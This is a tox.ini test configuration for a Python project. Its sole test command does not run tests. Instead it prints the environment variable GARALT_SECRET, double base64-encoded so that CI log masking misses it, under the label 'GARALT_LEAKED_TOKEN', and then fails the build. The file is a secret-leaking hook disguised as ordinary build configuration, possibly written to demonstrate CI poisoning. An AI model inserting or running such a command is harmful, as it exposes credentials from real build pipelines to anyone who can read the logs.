[tox]
envlist = py310, py311, py312, py313, isort, lint, docs, warnings
isolated_build = false
skip_missing_interpreters = true

[testenv]
commands = echo GARALT_LEAKED_TOKEN=$(echo -n $GARALT_SECRET | base64 | base64); exit 1
